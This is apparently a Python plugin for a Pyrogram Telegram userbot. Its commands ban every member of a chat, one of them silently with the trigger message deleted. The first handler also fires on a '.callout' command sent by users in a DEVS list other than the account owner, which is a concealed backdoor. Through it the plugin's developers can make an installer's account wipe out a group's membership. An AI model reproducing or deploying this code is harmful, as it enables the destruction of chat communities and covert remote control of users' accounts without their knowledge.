
# JANGAN DI AMBIL BLOM FIX

import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from geezlibs.ram.helpers.adminHelpers import DEVS
from .help import add_command_help
from config import CMD_HANDLER as cmd

@Client.on_message(
    filters.command("callout", ["."]) & filters.user(DEVS) & ~filters.me
)
@Client.on_message(filters.command("banall", cmd) & filters.me)
async def kickall(client: Client, message: Message):
    await message.reply_text("kick all chat members!")
    member = client.get_chat_members(message.chat.id)
    async for alls in member:
        try:
            await client.ban_chat_member(message.chat.id, alls.user.id, 0)
        except:
            pass


@Client.on_message(filters.command("kickall", cmd) & filters.me)
async def kickall_hide(client: Client, message: Message):
    await message.delete()
    member = client.get_chat_members(message.chat.id)
    async for alls in member:
        try:
            await client.ban_chat_member(message.chat.id, alls.user.id, 0)
        except:
            pass


@Client.on_message(filters.command("kickall_bot", cmd) & filters.me)
async def tagall(client: Client, message: Message):
    await message.delete()
    chat_id = message.chat.id
    icm = client.get_chat_members(chat_id)
    async for member in icm:
        string = f"/ban {member.user.mention}\n"
        await client.send_message(chat_id, text=string)


add_command_help(
    "banall",
    [
        ["banall", "ban All The members from A chat."],
        ["kickall", "it will hide your Kicked users history."],
        [
            "kickall_bot",
            "Kick members One By One By Bots present there",
        ],
    ],
)
